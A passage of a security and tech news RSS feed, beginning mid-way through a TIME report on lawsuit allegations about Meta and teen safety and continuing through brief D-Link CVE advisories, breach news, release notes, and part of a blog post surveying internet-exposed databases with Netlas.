health,” according to their master complaint. The newly unsealed allegations about Meta are just one small part of the sprawling suit. (TIME filed a motion to intervene in the case to ensure public access to court records; the motion was denied.)The plaintiffs’ brief, first reported by TIME, purports to be based on sworn depositions of current and former Meta executives, internal communications, and company research and presentations obtained during the lawsuit’s discovery process. It includes quotes and excerpts from thousands of pages of testimony and internal company documents. TIME was not able to independently view the underlying testimony or research quoted in the brief, since those documents remain under seal.  But the brief still paints a damning picture of the company’s internal research and deliberations about issues that have long plagued its platforms. Plaintiffs claim that since 2017, Meta has aggressively pursued young users, even as its internal research suggested its social media products could be addictive and dangerous to kids. Meta employees proposed multiple ways to mitigate these harms, according to the brief, but were repeatedly blocked by executives who feared that new safety features would hamper teen engagement or user growth.“We strongly disagree with these allegations, which rely on cherry-picked quotes and misinformed opinions in an attempt to present a deliberately misleading picture," a Meta spokesperson said in a statement to TIME. "The full record will show that for over a decade, we have listened to parents, researched issues that matter most, and made real changes to protect teens – like introducing Teen Accounts with built-in protections and providing parents with controls to manage their teens’ experiences. We’re proud of the progress we’ve made and we stand by our record.”In the years since the lawsuit was filed, Meta has implemented new safety features designed to address some of the problems described by plaintiffs. In 2024, Meta unveiled Instagram Teen Accounts, which defaults any user between 13 and 18 into an account that is automatically private, limits sensitive content, turns off notifications at night, and doesn’t allow messaging from unconnected adults. “We know parents are worried about their teens having unsafe or inappropriate experiences online, and that’s why we’ve significantly reimagined the Instagram experience for tens of millions of teens with new Teen Accounts,” a Meta spokeswoman told TIME in June. “These accounts provide teens with built-in protections to automatically limit who’s contacting them and the content they’re seeing, and teens under 16 need a parent’s permission to change those settings. We also give parents oversight over their teens’ use of Instagram, with ways to see who their teens are chatting with and block them from using the app for more than 15 minutes a day, or for certain periods of time, like during school or at night.”And yet the plaintiffs’ brief suggests that Meta resisted safety changes like these for years. The brief quotes testimony from Brian Boland, Meta’s former vice president of partnerships who worked at the company for 11 years and resigned in 2020. “My feeling then and my feeling now is that they don’t meaningfully care about user safety,” he allegedly said. “It’s not something that they spend a lot of time on. It’s not something they think about. And I really think they don’t care.”After the plaintiffs’ brief was unsealed late Friday night, Meta did not immediately respond to TIME’s requests for comment. Here are some of the most notable allegations from the plaintiffs’ omnibus brief: Allegation: Meta had a high threshold for "sex trafficking" content—and no way to report child sexual contentDespite Instagram’s “zero tolerance” policy for child sexual abuse material, the platform did not offer users a simple way to report child sexual abuse content, according to the brief. Plaintiffs allege that Jayakumar raised the issue multiple times when she joined Meta in 2020, but was told it would be too difficult to address. Yet Instagram allowed users to easily report far less serious violations, like “spam,” “intellectual property violation” and “promotion of firearms,” according to plaintiffs.Jayakumar was even more shocked to learn that Instagram had a disturbingly high tolerance for sex trafficking on the platform. According to the brief, she testified that Meta had a “17x” strike policy for accounts that reportedly engaged in the “trafficking of humans for sex,” meaning it would take at least 16 reports for an account to be deleted.   “Meta never told parents, the public, or the Districts that it doesn’t delete accounts that have engaged over fifteen times in sex trafficking,” the plaintiffs wrote. A Meta spokesperson disputed this allegation to TIME, saying the company has for years removed accounts immediately if it suspects them of human trafficking or exploitation and has made it easier over time for users to report content that violates child-exploitation policies. Allegation: Meta "lied to Congress" about its knowledge of harms on the platformFor years, plaintiffs allege, Meta’s internal research had found that teenagers who frequently use Instagram and Facebook have higher rates of anxiety and depression. In late 2019, according to the brief, Meta designed a “deactivation study,” which found that users who stopped using Facebook and Instagram for a week showed lower rates of anxiety, depression, and loneliness. Meta halted the study and did not publicly disclose the results, stating that the research study was biased by the “existing media narratives around the company.” (A Meta spokesperson told TIME that the study was initially conceived as a pair of one-weeks pilots, and researchers declined to continue it because it found that the only reductions in feelings of depression, anxiety, and loneliness were among people who already believed Facebook was bad for them.)At least one Meta employee was uncomfortable with the implications of this decision: “If the results are bad and we don’t publish and they leak,” this employee wrote, according to the brief, “is it going to look like tobacco companies doing research and knowing cigs were bad and then keeping that info to themselves?”Indeed, in December 2020, when the Senate Judiciary Committee asked the company in a set of written questions whether it was “able to determine whether increased use of its platform among teenage girls has any correlation with increased signs of depression” and “increased signs of anxiety,” the company offered only a one-word answer: “No.”To the plaintiffs in the case, the implication is clear: “The company never publicly disclosed the results of its deactivation study. Instead, Meta lied to Congress about what it knew.”Allegation: The company knew Instagram was letting adult strangers connect with teenagersFor years Instagram has had a well-documented problem of adults harassing teens. Around 2019, company researchers recommended making all teen accounts private by default in order to prevent adult strangers from connecting with kids, according to the plaintiffs’ brief. Instead of implementing this recommendation, Meta asked its growth team to study the potential impact of making all teen accounts private. The growth team was pessimistic, according to the brief, and responded that the change would likely reduce engagement. By 2020, the growth team had determined that a private-by-default setting would result in a loss of 1.5 million monthly active teens a year on Instagram. The plaintiffs’ brief quotes an unnamed employee as saying: “taking away unwanted interactions… is likely to lead to a potentially untenable problem with engagement and growth.” Over the next several months, plaintiffs allege, Meta’s policy, legal, communications, privacy, and well-being teams all recommended making teen accounts private by default, arguing that the switch “will increase teen safety” and was in line with expectations from users, parents, and regulators. But Meta did not launch the feature that year. Safety researchers were dismayed, according to excerpts of an internal conversation quoted in the filing. One allegedly grumbled: “Isn’t safety the whole point of this team?” “Meta knew that placing teens into a default-private setting would have eliminated 5.4 million unwanted interactions a day,” the plaintiffs wrote. Still, Meta didn’t make the fix. Instead, inappropriate interactions between adults and kids on Instagram skyrocketed to 38 times that on Facebook Messenger, according to the brief. The launch of Instagram Reels allegedly compounded the problem. It allowed young teenagers to broadcast short videos to a wide audience, including adult strangers..An internal 2022 audit allegedly found that Instagram’s Accounts You May Follow feature recommended 1.4 million potentially inappropriate adults to teenage users in a single day. By 2023, according to the plaintiffs, Meta knew that they were recommending minors to potentially suspicious adults and vice versa. It wasn’t until 2024 that Meta rolled out default privacy settings to all teen accounts. In the four years it took the company to implement their own safety recommendations, teens experienced billions of unwanted interactions with strangers online. Inappropriate encounters between teens and adults were common enough, according to the brief, that the company had an acronym for them: “IIC,” or “inappropriate interactions with children.” A Meta spokesperson said the company has defaulted teens under 16 to private accounts since 2021, began defaulting teens under 18 into private accounts with the introduction of its Teen Accounts program, and has taken steps to protect users from online predators. Allegation: Meta aggressively targeted young usersMeta feared young users would abandon Facebook and Instagram for their competitors. Acquiring and keeping young users became a central business goal. Meta CEO Mark Zuckerberg suggested that “teen time spent be our top goal of 2017,” according to a company executive quoted in the brief. That has remained the case, plaintiffs allege; internal company documents from 2024 stated that “acquiring new teen users is mission critical to the success of Instagram.” (A Meta spokesperson said time spent on its platforms is not currently a company goal.)Meta launched a campaign to connect with school districts and paid organizations like the National Parent Teacher Association and Scholastic to conduct outreach to schools and families. Meanwhile, according to the brief, Meta used location data to push notifications to students in “school blasts,” presumably as part of an attempt to increase youth engagement during the school day. As one employee allegedly put it: “One of the things we need to optimize for is sneaking a look at your phone under your desk in the middle of Chemistry :)”.Though Meta aggressively pursued young users, it may not have known exactly how old those new users were. Whistleblower Jason Sattizahn recently testified to Congress that Meta does not reliably know the age of its users. (Meta pushed back on Sattizahn’s testimony, saying in a statement to NBC that his claims were “nonsense” and “based on selectively leaked internal documents that were picked specifically to craft a false narrative.”) In 2022, according to the plaintiffs’ brief, there were 216 million users on Meta platforms whose age was “unknown.”Federal law requires social media platforms to observe various data-privacy safeguards for users under 13, and Meta policy states that users under 13 are not allowed on its platforms. Yet the plaintiffs’ court filing claims Meta knew that children under 13 used the company’s products anyway. Internal research cited in the brief suggested there were 4 million users under 13 on Instagram in 2015; by 2018, the plaintiffs claim, Meta knew that roughly 40% of children aged 9 to 12 said they used Instagram daily.The plaintiffs allege that this was a deliberate business strategy. The brief describes a coordinated effort to acquire young users that included studying the psychology and digital behavior of “tweens” and exploring new products designed for “users as young as 5-10.” Internally, some employees expressed disgust at the attempt to target preteens. “Oh good, we’re going after <13 year olds now?” one wrote, according to the brief. “Zuck has been talking about that for a while...targeting 11 year olds feels like tobacco companies a couple decades ago (and today). Like we’re seriously saying ‘we have to hook them young’ here.”Allegation: Meta's executives initially shelved efforts to make Instagram less toxic for teensTo combat toxic “social comparison,” in 2019 Instagram CEO Adam Mosseri announced a new product feature that would “hide” likes on posts. Meta researchers had determined that hiding likes would make users “significantly less likely to feel worse about themselves,” according to the plaintiffs’ brief. The initiative was code-named Project Daisy. But after a series of tests, Meta backtracked on Project Daisy. It determined the feature was “pretty negative to FB metrics,” including ad revenue, according to the plaintiffs’ brief, which quotes an unnamed employee on the growth team insisting: “It’s a social comparison app, fucking get used to it.” A similar debate took place over the app’s beauty filters. Plaintiffs claim that an internal review concluded beauty filters exacerbated the “risk and maintenance of several mental health concerns, including body dissatisfaction, eating disorders, and body dysmorphic disorder,” and that Meta knew that “children are particularly vulnerable.” Meta banned beauty filters in 2019, only to roll them back out the following year after the company realized that banning beauty filters would have a “negative growth impact,” according to the plaintiffs’ brief. Other company researchers allegedly built an AI “classifier” to identify content that would lead to negative appearance comparison, so that Meta could avoid recommending it to vulnerable kids. But Mosseri allegedly killed the project, disappointing developers who “felt like they had a solution” to “a big problem.”Allegation: Meta doesn't automatically remove harmful content, including self-harm contentWhile Meta developed AI tools to monitor the platforms for harmful content, the company didn’t automatically delete that content even when it determined with “100% confidence” that it violated Meta’s policies against child sexual-abuse material or eating-disorder content. Meta’s AI classifiers did not automatically delete posts that glorified self-harm unless they were 94% certain they violated platform policy, according to the plaintiffs’ brief. As a result, most of that content remained on the platform, where teenage users often discovered it. In a 2021 internal company survey cited by plaintiffs, more than 8% of respondents aged 13 to 15 reported having seen someone harm themselves, or threaten to do so, on Instagram during the past week.A Meta spokesperson said the company reports more child sexual-abuse material than any other service and uses an array of tools to proactively find that content, including photo and video-matching technologies as well as machine learning. The spokesperson said human reviewers assess content flagged before it is deleted to ensure it violates policies, prevent mistakes that could affect users, and maintain the integrity of the company's detection databases. Allegation: Meta knew its products were addictive, but publicly downplayed the harmsThe addictive nature of the company’s products wasn’t a secret internally. “Oh my gosh yall IG is a drug,” one of the company’s user-experience researchers allegedly wrote to a colleague. “We’re basically pushers.” Meta does not officially study addiction to its products, plaintiffs allege; it studies “problematic use.” In 2018, company researchers surveyed 20,000 Facebook users in the U.S. and found that 58% had some level of “problematic use”—55% mild, and 3.1% severe. But when Meta published an account of this research the following year, only the smaller number of users with “severe” problematic use was mentioned. “We estimate (as an upper bound) that 3.1% of Facebook users in the U.S. experience problematic use,” wrote the researchers. The other 55% of users are not mentioned anywhere in the public report. Plaintiffs allege that Meta’s safety team proposed features designed to lessen addiction, only to see them set aside or watered down. One employee who helped develop a “quiet mode” feature said it was shelved because Meta was concerned that this feature would negatively impact metrics related to growth and usage.Around the same time, another user-experience researcher at Instagram allegedly recommended that Meta inform the public about its research findings: “Because our product exploits weaknesses in the human psychology to promote product engagement and time spent,” the researcher wrote, Meta needed to “alert people to the effect that the product has on their brain.” This story has been updated to reflect additional comments from Meta. ]]></content:encoded></item><item><title>Enterprise password security and secrets management with Passwork 7</title><link>https://www.bleepingcomputer.com/news/security/enterprise-password-security-and-secrets-management-with-passwork-7/</link><author>Sponsored by Passwork</author><category>security</category><pubDate>Sun, 23 Nov 2025 14:45:54 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Passwork 7 unifies enterprise password and secrets management in a self-hosted platform. Organizations can automate credential workflows and test the full system with a free trial and up to 50% Black Friday savings. [...]]]></content:encoded></item><item><title>CVE-2025-13553 - D-Link DWR-M920 formPinManageSetup sub_41C7FC buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13553</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 14:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13553
 Nov. 23, 2025, 2:15 p.m. | 3 hours, 25 minutes ago
A weakness has been identified in D-Link DWR-M920 1.1.50. This affects the function sub_41C7FC of the file /boafrm/formPinManageSetup. This manipulation of the argument submit-url causes buffer overflow. It is possible to initiate the attack remotely. The exploit has been made available to the public and could be exploited.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13552 - D-Link DIR-822K/DWR-M920 formWlEncrypt buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13552</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 14:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13552
 Nov. 23, 2025, 2:15 p.m. | 3 hours, 25 minutes ago
A security flaw has been discovered in D-Link DIR-822K and DWR-M920 1.00_20250513164613/1.1.50. The impacted element is an unknown function of the file /boafrm/formWlEncrypt. The manipulation of the argument submit-url results in buffer overflow. The attack may be performed from remote. The exploit has been released to the public and may be exploited.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Cybersecurity News Weekly Newsletter – Fortinet, Chrome 0-Day Flaws, Cloudflare Outage and Salesforce Gainsight Breach</title><link>https://cybersecuritynews.com/cybersecurity-news-weekly-newsletter-nov-2025/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 13:55:00 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Welcome to this week’s edition of the Cybersecurity News Weekly Newsletter, where we analyze the critical incidents defining the current threat landscape.
If this week has taught us anything, it is th ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Iberia discloses customer data leak after vendor security breach</title><link>https://www.bleepingcomputer.com/news/security/iberia-discloses-customer-data-leak-after-vendor-security-breach/</link><author>Ax Sharma</author><category>security</category><pubDate>Sun, 23 Nov 2025 13:46:25 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Spanish flag carrier Iberia has begun notifying customers of a data security incident stemming from a compromise at one of its suppliers. The disclosure comes days after a threat actor claimed on hacker forums to have access to 77 GB of data allegedly stolen from the airline. [...]]]></content:encoded></item><item><title>Racket v9.0</title><link>https://blog.racket-lang.org/2025/11/racket-v9-0.html</link><author>Fice</author><category>dev</category><pubDate>Sun, 23 Nov 2025 13:35:27 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[posted by Stephen De Gabrielle and John ClementsA major release is always exciting and Racket 9.0 is no exception in that it introduces Parallel Threads. While Racket has had green threads for some time, and supports parallelism via futures and places, we feel parallel threads is a major addition.The  wrapper prevents the optimizing compiler from optimizing away certain computations entirely. This can be helpful in ensuring that benchmarks are accurate.When using BC Racket, the  function is changed to always return the parallel count.We now distribute “natipkg” packages for AArch64, useful for package-build and package-testing infrastructure.Check Syntax tracks identifiers more deeply nested in the “origin” field of syntax objects.There are many other repairs and documentation improvements!The following people contributed to this release:Alexander Shopov, Anthony Carrico, Bert De Ketelaere, Bogdan Popa, Cadence Ember, David Van Horn, Gustavo Massaccesi, Jade Sailor, Jakub Zalewski, Jens Axel Søgaard, jestarray, John Clements, Jordan Johnson, Matthew Flatt, Matthias Felleisen, Mike Sperber, Philip McGrath, RMOlive, Robby Findler, Ruifeng Xie, Ryan Culpepper, Sam Phillips, Sam Tobin-Hochstadt, Sebastian Rakel, shenleban tongying, Shu-Hung You, Stephen De Gabrielle, Steve Byan, and Wing Hei Chan. is a community developed open source project and we welcome new contributors. See racket/README.md to learn how you can be a part of this amazing project.If you can - please help get the word out to users and platform specific repo packagersRacket - the Language-Oriented Programming Language - version 9.0 is now available from https://download.racket-lang.org

See https://blog.racket-lang.org/2025/11/racket-v9-0.html for the release announcement and highlights.Replace this with your post text. Add one or more comma-separated Tags above. The special tag  will prevent the post from being published.]]></content:encoded></item><item><title>CVE-2025-13551 - D-Link DIR-822K/DWR-M920 formWanConfigSetup buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13551</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 13:15:47 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13551
 Nov. 23, 2025, 1:15 p.m. | 4 hours, 25 minutes ago
A vulnerability was identified in D-Link DIR-822K and DWR-M920 1.00_20250513164613/1.1.50. The affected element is an unknown function of the file /boafrm/formWanConfigSetup. The manipulation of the argument submit-url leads to buffer overflow. The attack is possible to be carried out remotely. The exploit is publicly available and might be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13550 - D-Link DIR-822K/DWR-M920 formVpnConfigSetup buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13550</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 13:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13550
 Nov. 23, 2025, 1:15 p.m. | 4 hours, 25 minutes ago
A vulnerability was determined in D-Link DIR-822K and DWR-M920 1.00_20250513164613/1.1.50. Impacted is an unknown function of the file /boafrm/formVpnConfigSetup. Executing manipulation of the argument submit-url can lead to buffer overflow. The attack can be executed remotely. The exploit has been publicly disclosed and may be utilized.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>New Costco Gold Star Members also get a $40 Digital Costco Shop Card*</title><link>https://www.bleepingcomputer.com/news/security/new-costco-gold-star-members-also-get-a-40-digital-costco-shop-card-/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sun, 23 Nov 2025 13:09:17 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The holidays can be hard on any budget, but there may be a way to make it a little easier. Instead of dashing through the snow all around town, get all your shopping done under one roof at Costco. Right now, you can even get a 1-Year Costco Gold Star Membership plus a $40 Digital Costco Shop Card*, and it's still only $65. [...]]]></content:encoded></item><item><title>New Costco Gold Star Members also get a $40 Digital Costco Shop Card</title><link>https://www.bleepingcomputer.com/news/security/new-costco-gold-star-members-also-get-a-40-digital-costco-shop-card/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sun, 23 Nov 2025 13:09:17 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The holidays can be hard on any budget, but there may be a way to make it a little easier. Instead of dashing through the snow all around town, get all your shopping done under one roof at Costco. Right now, you can even get a 1-Year Costco Gold Star Membership plus a $40 Digital Costco Shop Card*, and it's still only $65. [...]]]></content:encoded></item><item><title>Critical Vulnerability in Azure Bastion Let Attackers Bypass Authentication and Escalate privileges</title><link>https://cybersecuritynews.com/azure-bastion-vulnerability/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 13:00:25 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Critical Vulnerability in Azure Bastion Let Attackers Bypass Authentication and Escalate privileges
            A critical vulnerability in Azure Bastion (CVE-2025-49752) allows remote attackers to bypass authentication mechanisms and escalate privileges to administrative levels.
The flaw, categorized as an aut ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>A Swath of Bank Customer Data Was Hacked. The F.B.I. Is Investigating.</title><link>https://databreaches.net/2025/11/23/a-swath-of-bank-customer-data-was-hacked-the-f-b-i-is-investigating/?pk_campaign=feed&amp;pk_kwd=a-swath-of-bank-customer-data-was-hacked-the-f-b-i-is-investigating</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 23 Nov 2025 13:00:14 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Ph: Department of the Interior and Local Government to probe alleged data breach by hackers</title><link>https://databreaches.net/2025/11/23/ph-department-of-the-interior-and-local-government-to-probe-alleged-data-breach-by-hackers/?pk_campaign=feed&amp;pk_kwd=ph-department-of-the-interior-and-local-government-to-probe-alleged-data-breach-by-hackers</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 23 Nov 2025 12:59:58 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Critical 7 Zip Vulnerability With Public Exploit Requires Manual Update</title><link>https://hackread.com/7-zip-vulnerability-public-exploit-manual-update/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 12:48:05 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            A vulnerability has been found in the very popular, free file-compressing tool 7-Zip. The flaw, tracked as CVE-2025-11001, has a public exploit, leading to a high-risk warning from the UK’s NHS Englan ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Shaders: How to draw high fidelity graphics with just x and y coordinates</title><link>https://www.makingsoftware.com/chapters/shaders</link><author>Garbage</author><category>dev</category><pubDate>Sun, 23 Nov 2025 12:26:30 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-13549 - D-Link DIR-822K formNtp sub_455524 buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13549</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 12:15:46 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13549
 Nov. 23, 2025, 12:15 p.m. | 5 hours, 25 minutes ago
A vulnerability was found in D-Link DIR-822K 1.00. This issue affects the function sub_455524 of the file /boafrm/formNtp. Performing manipulation of the argument submit-url results in buffer overflow. Remote exploitation of the attack is possible. The exploit has been made public and could be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13548 - D-Link DIR-822K/DWR-M920 formFirewallAdv buffer overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13548</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 12:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13548
 Nov. 23, 2025, 12:15 p.m. | 5 hours, 25 minutes ago
A vulnerability has been found in D-Link DIR-822K and DWR-M920 1.00_20250513164613/1.1.50. This vulnerability affects unknown code of the file /boafrm/formFirewallAdv. Such manipulation of the argument submit-url leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>CVE-2025-13547 - D-Link DIR-822K/DWR-M920 formDdns memory corruption</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13547</link><author></author><category>vulns</category><pubDate>Sun, 23 Nov 2025 11:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13547
 Nov. 23, 2025, 11:15 a.m. | 6 hours, 25 minutes ago
A flaw has been found in D-Link DIR-822K and DWR-M920 1.00_20250513164613/1.1.50. This affects an unknown part of the file /boafrm/formDdns. This manipulation of the argument submit-url causes memory corruption. The attack may be initiated remotely. The exploit has been published and may be used.
 9.0 | HIGH

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>NocturneNotes — Secure Rust + GTK4 note‑taking with AES‑256‑GCM</title><link>http://www.jegly.xyz/</link><author>/u/reallylonguserthing</author><category>netsec</category><pubDate>Sun, 23 Nov 2025 11:04:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>YARA-X 1.10.0 Release: Fix Warnings, (Sun, Nov 23rd)</title><link>https://isc.sans.edu/diary/rss/32514</link><author></author><category>threatintel</category><pubDate>Sun, 23 Nov 2025 10:50:02 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[YARA-X's 1.10.0 release brings a new command: fix warnings.]]></content:encoded></item><item><title>Wireshark 4.4.1 Released, (Sun, Nov 23rd)</title><link>https://isc.sans.edu/diary/rss/32512</link><author></author><category>threatintel</category><pubDate>Sun, 23 Nov 2025 10:38:53 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Wireshark release 4.6.1 fixes 2 vulnerabilities and 20 bugs.]]></content:encoded></item><item><title>I Analysed Over 3 Million Exposed Databases Using Netlas</title><link>https://netlas.io/blog/exposed_databases/</link><author>/u/AnyThing5129</author><category>netsec</category><pubDate>Sun, 23 Nov 2025 10:19:58 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In one of my earlier articles about the largest data breaches in history, I kept running into the same theme again and again - Exposed Databases. Whether it was billions of social media credentials leaking online, or government systems left wide open, many of the large breaches weren’t caused by some crazy hack. Instead they were caused by something far simpler - Databases sitting on the internet with no authentication, no encryption, and no one watching.The Largest Data Breach Ever? How Hackers Stole 16 Billion CredentialsThat stuck with me. If so many incidents could be traced back to something as simple as misconfigured databases, I couldn’t help but think - How common is this problem today? Is it just some unlucky cases that made headlines or is there a much larger iceberg beneath the surface.This question led me down this rabbit hole. I wanted to see how many of the exposed databases on the internet are secure and how many of them are misconfigured. Using Netlas, a platform that continuously scans internet facing systems, I decided to conduct a research.So let’s get into the depth of this research and answer the question.For this research, I decided to focus on six of the most widely used database technologies: - A popular NoSQL database which is often chosen for its speed and flexibility. It’s also infamous for its misconfigurations where authentication is left off by default. - This is one of the oldest and most widely used relational database, it powers everything from wordpress blogs to massive SaaS platforms. - Known for powering mission critical systems, but its very complex with plenty of room for misconfigurations if it is not handled carefully. - Loved by developers for its reliable and advanced features, but just like the rest it is not immune to exposure. - Used in enterprise environments, where exposure can lead to serious consequences in industries. - The search and analytics engine, when exposed it can leak entire datasets in plain text.These databases power everything from startups to Fortune 500 companies, and together they are the backbone of most of the modern internet.
Each of these systems has its own strengths, but they also share a common weakness - when left exposed to the internet without proper configuration, they can leak massive amounts of sensitive information.Now talking about the objectives of my research, simple yet ambitious: - Find out how many of these database instances are directly accessible on the internet.Evaluate Security Controls - For each data type, define security checks like authentication, TLS support, version disclosure, etc, and test them at scale. - Develop a rule based system to label each instance as Critical, High, medium, or low risk depending on the controls it failed. - Look for trends across database type, geography, hosting providers, and misconfiguration types. - Build a Python tool that downloads the bulk data from Netlas, normalise it into a common schema, run all the database-specific security controls and finally output structured results as a CSV and a Summary file ready for analysis.To carry out this investigation at scale, I needed more than just curiosity, I needed visibility into the global internet. That’s where Netlas came in.If you are reading this article, you probably know about Netlas by now, but if you don’t - Netlas is like Google for the internet’s exposed assets.It continuously scans the global internet for IPs, ports, domains, WHOIS records, DNS data, etc, and organizes all of it into a structured, searchable index. At the time of writing, Netlas tracks:Why Netlas was perfect for this researchI needed three things to make this research possible: scale, detail and automation. - Netlas scans billions of records so I could pull results across six different database technologies. - The raw responses include everything from server versions and authentication banners to TLS flags and error messages. These became the evidence I tested my security controls against. - With the Netlas API, I could automatically query, download, and process huge amounts of data.The Dataset I Worked WithUsing Netlas’s API and datastore, I collected results for six database systems: MongoDB, Elasticsearch, MySQL, MSSQL, Oracle, and PostgreSQL.In total, this dataset covered over  exposed database instances worldwideEach instance came with rich metadata like banners, WHOIS, geolocation, and more.But working with a dataset of this scale was just the start. The real challenge was figuring out how to turn this data into meaningful insights. I wanted to measure how it was exposed, which controls it failed, and how much risk it posed. But to get there I needed a structured approach, This is where the research methodology comes in.Once I had the raw dataset in hand, the next step was to transform it into something meaningful. Collecting three million+ exposed database sounds impressive, but numbers alone aren’t always enough. What matters is understanding how securing or insecure those databases really are. To do that, I broke the research down into a few key steps:The first challenge was of course to find the exposed databases. Netlas allows very specific searches using its query language, so I could easily pull: -> to get mongoDB instances.protocol:"mysql" OR "mongodb" -> to get MySQL & MongoDB instances.And so on for the other databases.Each query returned raw JSON or CSV records that described the exposed service in detail like IP address, port, banners, flags, versions, geolocation, and much more. Instead of manually taking the data, Netlas gave me a really easy way to collect the evidence I needed.The exact query I used was:Every database type speaks its own language. MongoDB returns fields like , while MySQL provides , and Elasticsearch exposes , to compare them side by side, I needed to create a common schema.This is where my Python tool came in. It automatically:Parsed each Netlas record.Extracted fields which were relevant to the research.Standardized the format so that all six databases could be analysed together in a single CSV.Now that I had the data ready to be tested, I needed to define some security controls for each type of database.Defining Security ControlsThis was the heart of the research. Once I had millions of records normalised into a single schema, the next question was “What exactly am I checking for?”A database being online doesn’t necessarily mean it’s insecure. To separate the dangerous exposures from the harmless ones, I needed a checklist - a set of security controls tailored to each datatype.I didn’t invent these controls from thin air, each one came from established guidance like CIS Benchmarks, NIST, ISO, but adapted into a form I could actually test at scale through Netlas data.Here are the controls I implemented for each database:A “control” in this study means a specific check (e.g., authentication, TLS, error verbosity) that determines how secure or exposed a database is.Although the main focus of this research is really about looking at each control in isolation, seeing how often authentication fails, how often version info leaks, I realized that for the readers it might be easier to digest if there is a single label that captures the overall picture.Of course, I want to be clear upfront: risk labels are an approximation. Giving something a “Critical” or “Low” tag based purely on network banners is not the same as a full security assessment. But it helps highlight broad patterns across millions of records.Risk labels are not penetration tests, they’re simplified indicators that highlight broad patterns at scale.To get there, I implemented two simple approaches:Each database instance was tested against a set of security controls.The number of controls that failed was counted.For each instance, it calculates a risk tier using percentage-based model:: if >90% of applicable controls failed.This method was intentionally simple. It doesn’t capture the nuance that some controls are far more important than othersI also tried a weighted scoring system.Controls were assigned weights based on their severity: = +10 points. = +2 points.This score isn’t mapped directly to any label, but it gives a numeric risk index that can be compared across instances.These models are not perfect risk assessments, they are just rule based simplifications. For example, a database could fail just two controls but if one is authentication, the real-world impact is massive. That is why in this article, the main focus remains on per control 